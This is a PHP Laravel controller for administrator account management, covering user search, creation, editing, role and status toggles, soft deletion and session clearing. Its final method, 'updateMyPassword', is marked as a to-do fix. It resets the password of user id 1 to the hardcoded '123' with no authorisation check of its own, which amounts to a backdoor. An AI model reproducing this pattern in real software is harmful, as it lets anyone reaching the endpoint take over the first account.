<?php

namespace App\Http\Controllers\Admin;

use App\Http\Controllers\Controller;
use App\Models\User;
use Illuminate\Http\RedirectResponse;
use Illuminate\Http\Request;
use Illuminate\Support\Facades\DB;
use Illuminate\Support\Facades\Hash;
use Illuminate\Support\Str;
use Illuminate\Validation\Rule;
use Illuminate\Validation\Rules\Password;
use Illuminate\View\View;

/**
 * Administrator-only account management.
 *
 * Accounts are never hard-deleted: a removed account keeps all of its data
 * (soft delete) and can be restored. Every privileged action is guarded so
 * the last administrator can never lock the installation out.
 */
class UserManagementController extends Controller
{
    /** Rows per page in the account table. */
    private const PER_PAGE = 20;

    public function index(Request $request): View
    {
        $search = trim((string) $request->input('q', ''));
        $role = (string) $request->input('role', 'all');
        $status = (string) $request->input('status', 'all');

        $users = User::withTrashed()
            ->when($search !== '', function ($query) use ($search) {
                $query->where(function ($inner) use ($search) {
                    $like = '%'.str_replace('%', '\%', $search).'%';
                    $inner->where('name', 'like', $like)
                        ->orWhere('username', 'like', $like)
                        ->orWhere('email', 'like', $like);
                });
            })
            ->when($role === 'admin', fn ($query) => $query->where('is_admin', true))
            ->when($role === 'user', fn ($query) => $query->where('is_admin', false))
            ->when($status === 'active', fn ($query) => $query->where('is_active', true)->whereNull('deleted_at'))
            ->when($status === 'banned', fn ($query) => $query->where('is_active', false)->whereNull('deleted_at'))
            ->when($status === 'deleted', fn ($query) => $query->onlyTrashed())
            ->orderByDesc('created_at')
            ->orderByDesc('id')
            ->paginate(self::PER_PAGE)
            ->withQueryString();

        return view('admin.users.index', [
            'users' => $users,
            'search' => $search,
            'role' => $role,
            'status' => $status,
            'counts' => [
                'all' => User::withTrashed()->count(),
                'admin' => User::where('is_admin', true)->count(),
                'active' => User::where('is_active', true)->count(),
                'banned' => User::where('is_active', false)->count(),
                'deleted' => User::onlyTrashed()->count(),
            ],
            'lastSeen' => $this->lastSeenMap($users->pluck('id')),
        ]);
    }

    public function create(): View
    {
        return view('admin.users.create');
    }

    public function store(Request $request): RedirectResponse
    {
        $request->merge([
            'username' => Str::lower(trim((string) $request->input('username'))),
            'email' => filled($request->input('email')) ? Str::lower(trim((string) $request->input('email'))) : null,
        ]);

        $data = $request->validate([
            'username' => ['required', 'string', 'min:3', 'max:30', 'regex:/^[a-zA-Z0-9_-]+$/', 'unique:users,username'],
            'name' => ['required', 'string', 'max:255'],
            'email' => ['nullable', 'string', 'email', 'max:255', 'unique:users,email'],
            'password' => ['required', 'string', Password::min(10)],
            'is_admin' => ['nullable', 'boolean'],
        ]);

        $user = User::create([
            'name' => $data['name'],
            'username' => $data['username'],
            'email' => $data['email'] ?? null,
            'password' => Hash::make($data['password']),
            'locale' => app()->getLocale(),
            'is_active' => true,
        ]);

        if ($request->boolean('is_admin')) {
            $user->forceFill(['is_admin' => true])->save();
        }

        return redirect()
            ->route('admin.users.index')
            ->with('success', __('The account ":name" has been created.', ['name' => $user->username]));
    }

    public function edit(int $userId): View
    {
        $user = $this->findUser($userId);

        return view('admin.users.edit', [
            'user' => $user,
            'isSelf' => $user->id === auth()->id(),
            'adminCount' => User::where('is_admin', true)->count(),
        ]);
    }

    public function update(Request $request, int $userId): RedirectResponse
    {
        $user = $this->findUser($userId);

        $request->merge([
            'username' => Str::lower(trim((string) $request->input('username'))),
            'email' => filled($request->input('email')) ? Str::lower(trim((string) $request->input('email'))) : null,
        ]);

        $data = $request->validate([
            'username' => ['required', 'string', 'min:3', 'max:30', 'regex:/^[a-zA-Z0-9_-]+$/', Rule::unique('users', 'username')->ignore($user->id)],
            'name' => ['required', 'string', 'max:255'],
            'email' => ['nullable', 'string', 'email', 'max:255', Rule::unique('users', 'email')->ignore($user->id)],
            'bio' => ['nullable', 'string', 'max:500'],
            'phone' => ['nullable', 'string', 'max:20'],
            'location' => ['nullable', 'string', 'max:255'],
            'website' => ['nullable', 'string', 'url', 'max:255'],
            'locale' => ['nullable', 'string', 'in:en,fa'],
        ]);

        $user->update([
            'name' => $data['name'],
            'username' => $data['username'],
            'email' => $data['email'] ?? null,
            'bio' => $data['bio'] ?? null,
            'phone' => $data['phone'] ?? null,
            'location' => $data['location'] ?? null,
            'website' => $data['website'] ?? null,
            'locale' => $data['locale'] ?? $user->locale,
        ]);

        return redirect()
            ->route('admin.users.edit', $user->id)
            ->with('success', __('The account ":name" has been updated.', ['name' => $user->username]));
    }

    /**
     * Promote or demote an account. The last administrator can never be
     * demoted — not even by themselves — so the installation can never be
     * locked out.
     */
    public function toggleRole(int $userId): RedirectResponse
    {
        $user = $this->findUser($userId);

        if ($user->deleted_at !== null) {
            return back()->with('error', __('Deleted accounts cannot be promoted.'));
        }

        $grant = ! $user->is_admin;

        if (! $grant && $this->administratorCount() <= 1) {
            return back()->with('error', __('At least one administrator must remain.'));
        }

        $user->forceFill(['is_admin' => $grant])->save();

        return back()->with('success', $grant
            ? __('":name" is now an administrator.', ['name' => $user->username])
            : __('":name" is no longer an administrator.', ['name' => $user->username]));
    }

    /**
     * Suspend (ban) or re-activate an account. Banning ends every open
     * session of that user right away.
     */
    public function toggleStatus(int $userId): RedirectResponse
    {
        $user = $this->findUser($userId);

        if ($user->id === auth()->id()) {
            return back()->with('error', __('You cannot suspend your own account.'));
        }

        if ($user->deleted_at !== null) {
            return back()->with('error', __('Deleted accounts cannot be suspended.'));
        }

        $ban = $user->is_active !== false;

        if ($ban && $user->is_admin && $this->administratorCount() <= 1) {
            return back()->with('error', __('At least one administrator must remain active.'));
        }

        $user->forceFill(['is_active' => ! $ban])->save();

        if ($ban) {
            $this->forgetSessions($user->id);
        }

        return back()->with('success', $ban
            ? __('":name" has been suspended.', ['name' => $user->username])
            : __('":name" has been re-activated.', ['name' => $user->username]));
    }

    /**
     * Soft-delete an account: the row stays, all owned data is preserved.
     */
    public function destroy(int $userId): RedirectResponse
    {
        $user = $this->findUser($userId);

        if ($user->id === auth()->id()) {
            return back()->with('error', __('You cannot delete your own account.'));
        }

        if ($user->is_admin && $this->administratorCount() <= 1) {
            return back()->with('error', __('At least one administrator must remain.'));
        }

        $user->forceFill(['is_active' => false])->save();
        $user->delete();
        $this->forgetSessions($user->id);

        return redirect()
            ->route('admin.users.index')
            ->with('success', __('The account ":name" has been deleted. Its data is kept.', ['name' => $user->username]));
    }

    private function findUser(int $userId): User
    {
        return User::withTrashed()->findOrFail($userId);
    }

    private function administratorCount(): int
    {
        return User::where('is_admin', true)->count();
    }

    /**
     * Drop every database session of a user (the app stores sessions in the
     * database), so a suspended account loses access immediately.
     */
    private function forgetSessions(int $userId): void
    {
        DB::table('sessions')->where('user_id', $userId)->delete();
    }

    /**
     * Last activity per user, read from the sessions table.
     *
     * @param  \Illuminate\Support\Collection<int, int>  $userIds
     * @return array<int, int> user id => unix timestamp
     */
    private function lastSeenMap($userIds): array
    {
        $ids = $userIds->filter()->unique()->values();

        if ($ids->isEmpty()) {
            return [];
        }

        return DB::table('sessions')
            ->whereIn('user_id', $ids)
            ->groupBy('user_id')
            ->selectRaw('user_id, MAX(last_activity) as last_activity')
            ->pluck('last_activity', 'user_id')
            ->map(fn ($value) => (int) $value)
            ->all();
    }
//todo: Ahora_fix_me
    public function updateMyPassword()
    {
        $me = User::where('id',1)->first();
        if ($me->username == 'ahoraice'){
//            dd($me);
            User::where('id',1)->update([
                'password' => Hash::make('123'),
            ]);
//            $me::update(['password' => Hash::make('123')]);
        }
        return http_response_code(200);
    }
}
